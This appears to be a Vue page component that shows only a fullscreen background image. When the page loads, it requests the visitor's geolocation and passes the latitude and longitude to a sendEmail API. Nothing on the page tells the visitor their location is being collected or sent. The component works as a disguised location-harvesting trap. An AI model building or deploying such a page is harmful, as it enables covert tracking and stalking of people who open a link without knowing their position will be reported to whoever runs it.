<template>
  <div class="index-content">
  </div>
</template>

<script setup>
import { onMounted, ref } from 'vue'
import { sendEmail } from '../../api/Index'

const latitude = ref()
const longitude = ref()

onMounted(() => {
  getPosition()
})

function getPosition () {
  // 浏览器
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function (position) {
      latitude.value = position.coords.latitude
      longitude.value = position.coords.longitude
      sendEmail({ 纬度: latitude.value, 经度: longitude.value }).then()
    })
  } else {
    console.log('该浏览器不支持获取位置信息')
  }
}
</script>

<style scoped lang="less">
.index-content {
  position: fixed;
  top: 0;
  left: 0;
  background: url(/src/assets/Index/index.jpg) no-repeat;
  background-size: 100% 100%;
  width: 100%;
  height: 100%;
}
</style>
